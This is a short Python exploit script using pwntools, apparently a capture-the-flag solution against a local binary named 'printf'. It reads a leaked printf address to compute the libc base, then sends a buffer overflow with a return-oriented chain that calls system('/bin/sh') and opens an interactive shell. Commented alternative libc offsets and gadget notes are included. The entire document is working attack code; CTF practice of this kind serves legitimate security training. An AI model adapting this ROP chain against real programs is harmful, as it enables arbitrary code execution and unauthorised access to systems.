from pwn import *

#/lib64/libc.so.6
BIN_SH = 0x18d1ac#0x1b3e9a#0x18b1ac
PRINTF_OFF = 0x57CA0#0x571c0
SYSTEM_OFF = 0x499E0#0x3059df#0x491c0
POP_RDI = 0x26b62#0x2155f#0x26b12 # pop rdi ; ret

r = process("./printf")#,  env={"LD_PRELOAD": "libc.so.6"})
r.recvuntil("printf: ")

#gdb.attach(r)
#sleep(0.3)

printf = int(r.recvline().strip(), 16)
info("printf: 0x{:016x}".format(printf))

libc = printf - PRINTF_OFF
#libc = 0x00007ffff7df5000
info("libc: 0x{:016x}".format(libc))

msg = b"a" * 0x10
msg += p64(0)

msg += p64(libc + POP_RDI)
msg += p64(libc + BIN_SH)
msg += p64(libc + SYSTEM_OFF)

r.send(msg)

r.interactive()


'''
0x18d1ac /bin/sh
0x300aee __printf
0x3059df __libc_system
0x26b62 pop rdi ; ret
'''

# (int (*)(const char *, ...)) 0x7ffff7e4cca0 <__printf>
# (int (*)(const char *)) 0x7ffff7e3e9e0 <__libc_system>


# readelf -Ws /lib64/libc.so.6 | grep " printf"
